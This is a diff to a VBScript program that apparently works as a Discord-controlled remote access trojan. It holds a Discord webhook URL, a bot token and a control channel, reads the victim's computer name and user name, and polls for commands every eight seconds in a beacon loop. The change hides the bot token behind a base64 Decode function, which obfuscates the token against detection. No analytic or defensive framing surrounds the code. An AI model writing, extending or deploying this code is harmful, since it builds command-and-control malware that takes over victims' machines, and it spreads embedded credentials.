@@ -9,7 +9,7 @@ Dim sh, fso, WH, PC, USER, BotToken, ControlChannel, UuidFile, NumFile, uuid, my
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 WH = "https://discord.com/api/webhooks/1568851795470590064/RrYKVgks55HZfSahZGWe5ByKrB-ho-h8Sj9RNZSqNXN8E4NXhW2-5CqOpoFPp5gBe-hG"
-BotToken = "MTU2ODg1MjA0OTUyNzk3MTg0Mg.GwNg3_.Qy_v9XiVu8b5UB0IutWI4buAuZbIfpMyFpcT24"
+BotToken = Decode("TVRVMk9EZzFNakEwT1RVeU56azNNVGcwTWcuR3RLbl9sLlpEVVJUQTd4RTJyZktWQmNRWFRZNmREM0d6Z2tKRDZNMm82OWZz")
 ControlChannel = "1568851359044866119"
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
@@ -35,6 +35,26 @@ Do
     Call Poll
     WScript.Sleep 8000
 Loop
+
+Function Decode(b64)
+    Dim xml, node
+    Set xml = CreateObject("MSXML2.DOMDocument")
+    Set node = xml.createElement("b64")
+    node.dataType = "bin.base64"
+    node.text = b64
+    Decode = ""
+    Dim stream
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1
+    stream.Open
+    stream.Write node.nodeTypedValue
+    stream.Position = 0
+    stream.Type = 2
+    stream.Charset = "utf-8"
+    Decode = stream.ReadText
+    stream.Close
+End Function
+
 Sub Beacon()
     Dim ip
     On Error Resume Next
